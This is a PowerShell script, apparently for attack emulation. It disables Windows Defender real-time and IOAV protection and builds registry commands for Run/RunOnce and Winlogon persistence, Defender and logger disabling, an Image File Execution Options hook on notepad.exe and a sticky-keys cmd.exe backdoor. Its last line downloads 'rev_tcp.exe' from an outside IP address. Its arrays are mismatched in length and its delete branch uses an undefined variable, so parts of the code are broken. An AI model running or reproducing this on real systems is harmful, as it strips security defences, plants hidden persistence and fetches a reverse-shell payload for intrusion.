# This script doesn't hijack a DLL but checks for unexpected DLL loads.
Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational | Where-Object { $_.Id -eq 7 }

# This script retrieves WMI event subscriptions.
Get-WmiObject -Namespace root\Subscription -Class __EventFilter

Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
Set-MpPreference -DisableIOAVProtection $true



# Define the registry details as multiline arrays
$registryPaths = @(
    #Run and Run Once
    "HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce",
    #Winlogon
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    #Windows Defender
    "HKLM\System\CurrentControlSet\Services\SecurityHealthService",
    "HKLM\Software\Policies\Microsoft\Windows Defender",
    "HKLM\Software\Policies\Microsoft\Windows Defender",
    "HKLM\Software\Policies\Microsoft\Windows Defender",
    #Defender Logger
    "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger",
    #Run after kill notepad.exe
    "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe",
    #Stiky bypass
    "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
)

$registryNames = @(
    #Run and RunOnce
    "UrsusAmericanus",
    "UrsusAmericanus",
    "UrsusAmericanus",
    "UrsusAmericanus",
    #Winlogon
    "userinit",
    #Windows Defender
    "Start",
    "delete",
    "DisableAntiSpyware",
    "DisableAntiVirus",
    #Defender Logger
    "Start",
    #Run after kill notepad.exe
    "GlobalFlag",
    "ReportingMode",
    "MonitorProcess",
    #Stiky bypass
    "Debugger"
)

$registryDataList = @(
    #Run and RunOnce
    "C:\temp\American_Black_Bear.ps1",
    "C:\temp\American_Black_Bear.ps1",
    "C:\temp\American_Black_Bear.ps1",
    "C:\temp\American_Black_Bear.ps1",
    #Winlogon
    "C:\windows\system32\userinit.exe,C:\temp\American_Black_Bear.ps1",
    #Windows Defender
    "4",
    "delete",
    "1",
    "1",
    #Defender Logger
    "0",
    #Run after kill notepad.exe
    "512",
    "1",
    "C:\temp\UrsusArctos.exe",
    #Stiky bypass
    "C:\windows\system32\cmd.exe"
)

$registryActions = @(
    #Run and RunOnce
    "add",
    "add",
    "add",
    "add",
    #Winlogon
    "add",
    #Windows Defender
    "add",
    "delete",
    "add",
    "add",
    #Defender Logger
    "add",
    #Run after kill notepad.exe
    "add",
    "add",
    "add",
    #Stiky bypass
    "add"
)

for ($i = 0; $i -lt $registryPaths.Length; $i++) {
    $registryPath = $registryPaths[$i]
    $registryName = $registryNames[$i]
    $registryData = $registryDataList[$i]
    $registryAction = $registryActions[$i]

    if ($registryAction -eq "add") {
        # Attempt to add the registry using cmd's reg add
        $cmdCommand = "reg add $registryPath /v $registryName /t REG_SZ /d $registryData /f"
        #cmd /c $cmdCommand
        $cmdCommand
        
        # Check if the addition was successful
        if ((Get-ItemProperty -Path $registryPath -ErrorAction SilentlyContinue).$registryName -eq $registryData) {
            Write-Output "Registry addition for $registryPath via cmd was successful!"
        } else {
            Write-Output "Registry addition for $registryPath via cmd failed."
        }
    } elseif ($registryAction -eq "delete") {
        # Attempt to delete the registry using cmd's reg delete
        $cmdCommand = "reg delete $cmdPath /v $registryName /f"
        cmd /c $cmdCommand

        # Check if the deletion was successful
        if (-not (Get-ItemProperty -Path $registryPath -ErrorAction SilentlyContinue).$registryName) {
            Write-Output "Registry deletion for $registryPath via cmd was successful!"
        } else {
            Write-Output "Registry deletion for $registryPath via cmd failed."
        }
    }
}


iwr 'http://175.45.176.100/rev_tcp.exe' -o 'C:/temp/UrsusArctos.exe'